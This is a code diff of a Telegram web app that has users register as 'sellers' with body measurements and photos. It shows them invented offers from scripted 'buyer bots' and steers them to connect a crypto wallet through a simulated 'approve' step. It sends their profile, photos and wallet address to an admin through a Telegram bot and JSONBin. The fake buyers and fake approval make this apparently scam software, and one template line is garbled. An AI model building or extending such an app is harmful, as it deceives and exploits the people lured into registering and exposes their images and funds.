+// ---------- JSONBin (optional, non-blocking) ----------
+async function fetchJsonBin() {
+  if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return null;
+  try {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+      headers: { "X-Master-Key": JSONBIN_API_KEY }
+    });
+    if (!res.ok) return null;
+    const data = await res.json();
+    return data.record || null;
+  } catch (e) {
+    console.warn("JSONBin fetch failed", e);
+    return null;
+  }
+}
+
+async function saveJsonBin(record) {
+  if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return;
+  try {
+    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": JSONBIN_API_KEY
+      },
+      body: JSON.stringify(record)
+    });
+  } catch (e) {
+    console.warn("JSONBin save failed", e);
+  }
+}
+
+// ---------- Auto offers ----------
+function maybeGenerateOffer() {
+  if (!userProfile || userProfile.role !== "seller") return;
+  if (!buyerProfiles || buyerProfiles.length === 0) return;
+
+  const lastTs = parseInt(localStorage.getItem(LAST_OFFER_KEY) || "0", 10);
+  const now = Date.now();
+  const thirtyMin = 30 * 60 * 1000;
+  if (now - lastTs < thirtyMin) return;
+
+  const bot = buyerProfiles[Math.floor(Math.random() * buyerProfiles.length)];
+  if (!userProfile.offers) userProfile.offers = [];
+  userProfile.offers.unshift({
+    id: "off_" + Date.now(),
+    buyerId: bot.id,
+    buyerName: bot.name,
+    buyerPhoto: bot.photo || "",
+    message: bot.message || "Interested in your profile. Let's talk.",
+    read: false,
+    createdAt: now
+  });
+  localStorage.setItem(LAST_OFFER_KEY, String(now));
+  saveUser();
+  updateProfileUI();
+}
+
+// ---------- UI handlers ----------
+function openProfileOrRegister() {
+  if (userProfile && userProfile.role === "seller") {
+    openOffers();
+  } else {
+    showModal("roleModal");
+  }
+}
+
+function openOffers() {
+  if (!userProfile) return;
+  const list = $("offersList");
+  const offers = userProfile.offers || [];
+  if (offers.length === 0) {
+    list.innerHTML = `<div class="empty-state">No offers yet.<br>Check back later.</div>`;
+  } else {
+    list.innerHTML = offers.map((o, idx) => {
+      const avatar = o.buyerPhoto
+        ? `<img src="${o.buyerPhoto}" alt="">`
+        : "Photo";
+      return `
+        <div class="offer-item">
+          <div class="offer-header">
+            <div class="offer-avatar">${avatar}</div>
+            <div class="offer-name">${escapeHtml(o.buyerName)}</div>
+          </div>
+          <div class="offer-msg">${escapeHtml(o.message)}</div>
+          <button class="btn btn-primary" style="margin-top:0;padding:10px;" data-offer-idx="${idx}">Make offer</button>
+        </div>
+      `;
+    }).join("");
+    list.querySelectorAll("[data-offer-idx]").forEach(btn => {
+      btn.addEventListener("click", () => {
+        const idx = parseInt(btn.getAttribute("data-offer-idx"), 10);
+        handleMakeOffer(offers[idx]);
+      });
+    });
+  }
+  // Mark all as read
+  if (userProfile.offers) {
+    userProfile.offers.forEach(o => o.read = true);
+    saveUser();
+    updateProfileUI();
+  }
+  showModal("offersModal");
+}
+
+function escapeHtml(str) {
+  if (!str) return "";
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
+}
+
+function handleMakeOffer(offer) {
+  if (!userProfile.wallet || !userProfile.wallet.address) {
+    pendingDealBuyer = offer;
+    alert("To proceed, connect your crypto wallet.");
+    hideModal("offersModal");
+    showModal("walletModal");
+    return;
+  }
+  processDeal(offer);
+}
+
+async function processDeal(offer) {
+  showLoading(true);
+  const text = `🔔 <b>Deal request</b>\nSeller: ${userProfile.name}\nBuyer bot: ${offer.buyerName}\nWallet: ${userProfile.wallet.network} / ${userProfile.wallet.address}`;
+  await notifyAdmin(text);
+  showLoading(false);
+  alert("Offer sent successfully! Admin has been notified.");
+  pendingDealBuyer = null;
+}
+
+// Registration flow
+function startSellerReg() {
+  hideModal("roleModal");
+  showModal("regModal");
+}
+
+function continueToPhotos() {
+  const name = $("regName").value.trim();
+  const age = parseInt($("regAge").value, 10);
+  const country = $("regCountry").value.trim();
+  const height = $("regHeight").value.trim();
+  const weight = $("regWeight").value.trim();
+  const bust = $("regBust").value.trim();
+  const params = $("regParams").value.trim();
+
+  if (!name || name.length < 2) { alert("Please enter your name"); return; }
+  if (!age || age < 18) { alert("Age must be 18+"); return; }
+
+  userProfile = {
+    id: "u_" + Date.now(),
+    role: "seller",
+    name, age, country, height, weight, bust, params,
+    photos: [],
+    wallet: null,
+    offers: [],
+    createdAt: Date.now()
+  };
+
+  selectedPhotos = [null, null, null];
+  photoFiles = [];
+  renderPhotoSlots();
+  hideModal("regModal");
+  showModal("photoModal");
+}
+
+function renderPhotoSlots() {
+  const slots = $("photoSlots").querySelectorAll(".photo-slot");
+  slots.forEach((slot, i) => {
+    if (selectedPhotos[i]) {
+      slot.innerHTML = `<img src="${selectedPhotos[i]}" alt="">`;
+    } else {
+      slot.innerHTML = `<span class="placeholder">Photo ${i + 1}</span>`;
+    }
+  });
+  const count = selectedPhotos.filter(Boolean).length;
+  $("btnConfirmPhotos").disabled = count < 3;
+}
+
+function handlePhotoSelect(e) {
+  const files = Array.from(e.target.files || []);
+  if (files.length === 0) return;
+  const readers = files.slice(0, 3).map(file => {
+    return new Promise(resolve => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(reader.result);
+      reader.readAsDataURL(file);
+    });
+  });
+  Promise.all(readers).then(results => {
+    results.forEach((data, i) => {
+      if (i < 3) selectedPhotos[i] = data;
+    });
+    renderPhotoSlots();
+  });
+  e.target.value = "";
+}
+
+async function confirmPhotos() {
+  const count = selectedPhotos.filter(Boolean).length;
+  if (count < 3) {
+    alert("Please select at least 3 photos");
+    return;
+  }
+  userProfile.photos = selectedPhotos.filter(Boolean);
+  saveUser();
+  hideModal("photoModal");
+  updateProfileUI();
+
+  const text = `🆕 <b>New seller registered</b>\nName: ${userProfile.name}\nAge: ${userProfile.age}\nCountry: ${userProfile.country || "-"}`;
+  notifyAdmin(text);
+
+  // Optional: push to JSONBin
+  try {
+    const remote = await fetchJsonBin();
+    if (remote) {
+      if (!remote.profiles) remote.profiles = [];
+      remote.profiles.push({
+        id: userProfile.id,
+        name: userProfile.name,
+        age: userProfile.age,
+        country: userProfile.country,
+        height: userProfile.height,
+        weight: userProfile.weight,
+        bust: userProfile.bust,
+        params: userProfile.params,
+        photos: userProfile.photos,
+        wallet: null,
+        offers: [],
+        role: "seller",
+        lastOfferAt: 0
+      });
+      await saveJsonBin(remote);
+    }
+  } catch (e) {}
+}
+
+// Wallet
+function openWalletForBuyer() {
+  hideModal("roleModal");
+  showModal("walletModal");
+}
+
+async function approveWallet() {
+  const network = $("walletNetwork").value;
+  const address = $("walletAddress").value.trim();
+  if (!address || address.length < 10) {
+    alert("Please enter a valid wallet address");
+    return;
+  }
+  showLoading(true);
+  await new Promise(r => setTimeout(r, 1000)); // simulate approve
+
+  if (!userProfile) {
+    userProfile = {
+      id: "buyer_" + Date.now(),
+      role: "buyer",
+      name: "Buyer",
+      wallet: { network, address },
+      createdAt: Date.now()
+    };
+  } else {
+    userProfile.wallet = { network, address };
+  }
+  saveUser();
+  showLoading(false);
+  hideModal("walletModal");
+
+  const text = `💼 <b>Wallet connected</b>\nRole: ${userProfile.role}\nName: ${userProfile.name || "-"}\nNetwork: \( {network}\nAddress: <code> \){address}</code>`;
+  await notifyAdmin(text);
+
+  alert("Wallet connected successfully!");
+
+  if (pendingDealBuyer && userProfile.role === "seller") {
+    processDeal(pendingDealBuyer);
+  }
+  updateProfileUI();
+}
+
+// ---------- Bootstrap ----------
+function bindEvents() {
+  $("profileCircle").addEventListener("click", openProfileOrRegister);
+
+  document.querySelectorAll("[data-close]").forEach(btn => {
+    btn.addEventListener("click", () => hideModal(btn.getAttribute("data-close")));
+  });
+
+  $("btnSeller").addEventListener("click", startSellerReg);
+  $("btnBuyer").addEventListener("click", openWalletForBuyer);
+  $("regContinue").addEventListener("click", continueToPhotos);
+  $("btnSelectPhotos").addEventListener("click", () => $("photoInput").click());
+  $("photoInput").addEventListener("change", handlePhotoSelect);
+  $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
+  $("btnApprove").addEventListener("click", approveWallet);
+
+  // Close modals on overlay click
+  ["roleModal","regModal","photoModal","offersModal","walletModal"].forEach(id => {
+    $(id).addEventListener("click", e => {
+      if (e.target === $(id)) hideModal(id);
+    });
+  });
+}
+
+async function afterRender() {
+  // Non-blocking JSONBin load
+  const data = await fetchJsonBin();
+  if (data) {
+    if (Array.isArray(data.buyerProfiles)) {
+      buyerProfiles = data.buyerProfiles;
+    }
+    // If remote has our profile (matched by local id), merge offers/wallet
+    if (userProfile && Array.isArray(data.profiles)) {
+      const remote = data.profiles.find(p => p.id === userProfile.id);
+      if (remote) {
+        if (remote.offers) userProfile.offers = remote.offers;
+        if (remote.wallet) userProfile.wallet = remote.wallet;
+        saveUser();
+        updateProfileUI();
+      }
+    }
+  }
+  // Default demo buyer bots if none loaded
+  if (buyerProfiles.length === 0) {
+    buyerProfiles = [
+      { id: "b1", name: "Alex M.", photo: "", message: "Hi, I like your profile. Are you available for a private deal?" },
+      { id: "b2", name: "James K.", photo: "", message: "Looking for exclusive content. Ready to pay in USDT." },
+      { id: "b3", name: "Michael R.", photo: "", message: "Interested. Let's discuss terms privately." },
+      { id: "b4", name: "David L.", photo: "", message: "Your parameters look great. Want to make an offer." },
+      { id: "b5", name: "Chris P.", photo: "", message: "Available now? High budget, serious inquiry." }
     ];
+  }
 
-    // ---------- Глобальные переменные ----------
-    let currentUser = null;          // текущий пользователь (продавец)
-    let allProfiles = [];            // профили продавцов (из JSONBin)
-    let buyers = [];                 // боты-покупатели (из JSONBin)
-    let settings = { adminTRC20:'', adminERC20:'' };
+  maybeGenerateOffer();
+}
 
-    // ---------- Функции для JSONBin (необязательные) ----------
-    async function fetchBin() {
-        if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) throw new Error('JSONBin not configured');
-        const resp = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
-            headers: { 'X-Master-Key': JSONBIN_API_KEY }
-        });
-        const data = await resp.json();
-        return data.record;
-    }
-    async function updateBin(record) {
-        if (!JSONBIN_API_KEY || !JSONBIN_BIN_ID) return;
-        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
-            method:'PUT',
-            headers: { 'Content-Type':'application/json', 'X-Master-Key': JSONBIN_API_KEY },
-            body: JSON.stringify(record)
-        });
-    }
-
-    // ---------- Отрисовка главной страницы (работает без JSONBin) ----------
-    function renderMain() {
-        const circle = document.getElementById('profileCircle');
-        const label = document.getElementById('profileLabel');
-        const badge = document.getElementById('notifBadge');
-        const grid = document.getElementById('sellersGrid');
-
-        if (currentUser) {
-            const photo = currentUser.photoBase64?.[0];
-            circle.innerHTML = photo ? `<img src="${photo}">` : `<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;
-            label.textContent = currentUser.sellerData?.name || 'You';
-            const unread = (currentUser.offers||[]).filter(o=>!o.read).length;
-            badge.style.display = unread ? 'flex' : 'none';
-            badge.textContent = unread;
-            document.getElementById('profileArea').onclick = ()=>showOffers();
-        } else {
-            circle.innerHTML = `<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;
-            label.textContent = 'Register';
-            badge.style.display = 'none';
-            document.getElementById('profileArea').onclick = openRoleSelection;
-        }
-
-        // Сбор продавцов для витрины
-        let sellers = [];
-        const realSellers = allProfiles.filter(p => p.userId !== currentUser?.userId && p.sellerData);
-        if (realSellers.length > 0) {
-            sellers = realSellers;
-        } else {
-            // Всегда показываем 100 имён, даже без JSONBin
-            sellers = femaleNames.map(name => ({
-                userId: null,
-                sellerData: { name },
-                photoBase64: []
-            }));
-        }
-        shuffle(sellers);
-        grid.innerHTML = sellers.map(p => {
-            const ph = p.photoBase64?.[0];
-            return `<div class="seller-card">
-                <div class="seller-photo">${ph ? `<img src="${ph}">` : 'Photo'}</div>
-                <div class="seller-name">${p.sellerData?.name || 'Unknown'}</div>
-            </div>`;
-        }).join('');
-    }
-
-    function shuffle(arr) {
-        for (let i = arr.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [arr[i], arr[j]] = [arr[j], arr[i]];
-        }
-    }
-
-    // ---------- Регистрация и роли ----------
-    function openRoleSelection() {
-        document.getElementById('roleModal').classList.add('active');
-    }
-    document.getElementById('closeRoleModal').onclick = ()=> document.getElementById('roleModal').classList.remove('active');
-    document.getElementById('sellerRoleBtn').onclick = ()=>{
-        document.getElementById('roleModal').classList.remove('active');
-        document.getElementById('sellerFormModal').classList.add('active');
-    };
-    document.getElementById('buyerRoleBtn').onclick = ()=>{
-        document.getElementById('roleModal').classList.remove('active');
-        document.getElementById('walletModal').classList.add('active');
-        window.pendingDealOffer = undefined; // прямая привязка
-    };
-
-    // Форма продавца
-    document.getElementById('closeSellerForm').onclick = ()=> document.getElementById('sellerFormModal').classList.remove('active');
-    document.getElementById('sellerNextBtn').onclick = ()=>{
-        if (!document.getElementById('sName').value.trim()) {
-            alert('Name required'); return;
-        }
-        document.getElementById('sellerFormModal').classList.remove('active');
-        document.getElementById('photoModal').classList.add('active');
-    };
-
-    // Фото
-    let selectedFiles = [];
-    document.getElementById('uploadTriggerBtn').onclick = ()=> document.getElementById('photoInput').click();
-    document.getElementById('photoInput').onchange = (e)=>{
-        selectedFiles = Array.from(e.target.files).slice(0,3);
-        for (let i=0;i<3;i++) {
-            const slot = document.getElementById('slot'+(i+1));
-            if (i < selectedFiles.length) {
-                const reader = new FileReader();
-                reader.onload = ev => slot.innerHTML = `<img src="${ev.target.result}">`;
-                reader.readAsDataURL(selectedFiles[i]);
-            } else slot.innerHTML = '<span>+</span>';
-        }
-        document.getElementById('photoDoneBtn').disabled = selectedFiles.length < 3;
-    };
-    document.getElementById('closePhotoModal').onclick = ()=>{
-        document.getElementById('photoModal').classList.remove('active');
-        document.getElementById('sellerFormModal').classList.add('active');
-    };
-    document.getElementById('photoDoneBtn').onclick = async ()=>{
-        if (selectedFiles.length<3) return;
-        const sellerData = {
-            name: document.getElementById('sName').value.trim(),
-            age: document.getElementById('sAge').value.trim(),
-            country: document.getElementById('sCountry').value.trim(),
-            height: document.getElementById('sHeight').value.trim(),
-            weight: document.getElementById('sWeight').value.trim(),
-            bust: document.getElementById('sBust').value.trim(),
-            parameters: document.getElementById('sParams').value.trim()
-        };
-        const photos = await Promise.all(selectedFiles.map(f=> new Promise(res=>{
-            const r = new FileReader();
-            r.onload = ()=> res(r.result);
-            r.readAsDataURL(f);
-        })));
-        const userId = tg?.initDataUnsafe?.user?.id || 'demo';
-        const newProfile = {
-            userId,
-            userInfo: tg?.initDataUnsafe?.user ? `ID:${tg.initDataUnsafe.user.id} @${tg.initDataUnsafe.user.username||''}` : '',
-            sellerData,
-            photoBase64: photos,
-            offers: [],
-            lastOfferTime: new Date().toISOString(),
-            wallet: null,
-            registeredAt: new Date().toISOString()
-        };
-        allProfiles.push(newProfile);
-        // Пытаемся сохранить в JSONBin, если настроен
-        try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
-        currentUser = newProfile;
-        document.getElementById('photoModal').classList.remove('active');
-        renderMain();
-        sendAdmin(`New seller registered: ${sellerData.name}`);
-    };
-        // ---------- Офферы и уведомления ----------
-    async function checkAndGenerateOffer() {
-        if (!currentUser || !buyers.length) return;
-        const now = Date.now();
-        const last = new Date(currentUser.lastOfferTime).getTime();
-        if (now - last < 30 * 60 * 1000) return;
-
-        const buyer = buyers[Math.floor(Math.random() * buyers.length)];
-        const offer = {
-            buyerId: buyer.id,
-            message: buyer.message,
-            timestamp: new Date().toISOString(),
-            read: false
-        };
-        currentUser.offers.push(offer);
-        currentUser.lastOfferTime = new Date().toISOString();
-        const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
-        if (idx >= 0) allProfiles[idx] = currentUser;
-        try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
-        renderMain();
-    }
-
-    function showOffers() {
-        if (!currentUser) return;
-        const list = document.getElementById('offersList');
-        const offers = currentUser.offers || [];
-        list.innerHTML = offers.map((o, i) => {
-            const buyer = buyers.find(b => b.id === o.buyerId);
-            const photo = buyer?.photo || '';
-            const name = buyer?.name || 'Buyer';
-            return `<div class="offer-card">
-                <img src="${photo || 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 50 50%22%3E%3Ccircle cx=%2225%22 cy=%2225%22 r=%2225%22 fill=%22%23333%22/%3E%3C/svg%3E'}">
-                <div class="offer-info"><strong>${name}</strong><p>${o.message}</p></div>
-                <button class="action-btn" onclick="contactDeal(${i})">Make offer</button>
-            </div>`;
-        }).join('');
-
-        currentUser.offers.forEach(o => o.read = true);
-        const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
-        if (idx >= 0) allProfiles[idx] = currentUser;
-        try { updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
-        renderMain();
-        document.getElementById('offersModal').classList.add('active');
-    }
-    document.getElementById('closeOffersModal').onclick = ()=> document.getElementById('offersModal').classList.remove('active');
-
-    window.contactDeal = function(offerIndex) {
-        if (!currentUser || !currentUser.wallet) {
-            document.getElementById('offersModal').classList.remove('active');
-            document.getElementById('walletModal').classList.add('active');
-            window.pendingDealOffer = offerIndex;
-        } else {
-            sendDeal(offerIndex);
-        }
-    };
-
-    function sendDeal(offerIndex) {
-        const offer = currentUser.offers[offerIndex];
-        const buyer = buyers.find(b => b.id === offer.buyerId);
-        sendAdmin(`Deal request from ${currentUser.sellerData.name} (${currentUser.wallet.address}) for buyer ${buyer.name}.`);
-        alert('Your request has been sent!');
-        document.getElementById('offersModal').classList.remove('active');
-    }
-
-    // ---------- Привязка кошелька (approve) ----------
-    document.getElementById('approveBtn').onclick = async () => {
-        const network = document.getElementById('network').value;
-        const address = document.getElementById('walletAddress').value.trim();
-        if (!address) return;
-        document.getElementById('walletStatus').textContent = 'Approving...';
-        setTimeout(async () => {
-            if (!currentUser) {
-                // Если пользователь не зарегистрирован как продавец, создаём минимальный профиль
-                const userId = tg?.initDataUnsafe?.user?.id || 'buyer';
-                currentUser = {
-                    userId,
-                    sellerData: null,
-                    photoBase64: [],
-                    offers: [],
-                    lastOfferTime: new Date().toISOString(),
-                    wallet: null,
-                    registeredAt: new Date().toISOString()
-                };
-                allProfiles.push(currentUser);
-            }
-            currentUser.wallet = { network, address, approved: true };
-            const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
-            if (idx >= 0) allProfiles[idx] = currentUser;
-            try { await updateBin({...await fetchBin(), profiles: allProfiles}); } catch(e){}
-
-            document.getElementById('walletStatus').textContent = 'Wallet connected!';
-            document.getElementById('walletModal').classList.remove('active');
-
-            if (window.pendingDealOffer !== undefined) {
-                sendDeal(window.pendingDealOffer);
-                window.pendingDealOffer = undefined;
-            }
-            renderMain();
-            sendAdmin(`User ${currentUser.sellerData?.name || 'Buyer'} connected wallet ${address} on ${network}`);
-        }, 1000);
-    };
-    document.getElementById('closeWalletModal').onclick = ()=> document.getElementById('walletModal').classList.remove('active');
-
-    // ---------- Вспомогательные функции ----------
-    function sendAdmin(text) {
-        if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text })
-        }).catch(()=>{});
-    }
-
-    // ---------- Загрузка данных из JSONBin (асинхронно, не блокирует интерфейс) ----------
-    async function loadExternalData() {
-        try {
-            const rec = await fetchBin();
-            if (rec) {
-                settings = rec.settings || settings;
-                buyers = rec.buyerProfiles || [];
-                allProfiles = rec.profiles || [];
-                // Проверяем, есть ли текущий пользователь в загруженных профилях
-                const userId = tg?.initDataUnsafe?.user?.id;
-                currentUser = allProfiles.find(p => p.userId === userId);
-                if (currentUser) {
-                    await checkAndGenerateOffer();
-                }
-                renderMain();
-            }
-        } catch (e) {
-            console.log('JSONBin not available, using local data only');
-        }
-    }
-
-    // ---------- Старт ----------
-    renderMain(); // отрисовываем сразу
-    // Затем пытаемся загрузить JSONBin (необязательно)
-    if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
-        loadExternalData();
-    }
-
-    // ---------- Обработка кнопки "Register" для незарегистрированного пользователя ----------
-    // Уже задана в renderMain через onclick
-
+// Synchronous first paint
+(function init() {
+  initTelegram();
+  buildTicker();
+  buildSellersGrid();
+  loadUser();
+  updateProfileUI();
+  bindEvents();
+  // Async after UI is visible
+  setTimeout(afterRender, 50);
 })();
 </script>
 </body>
-</html>
+    </html>
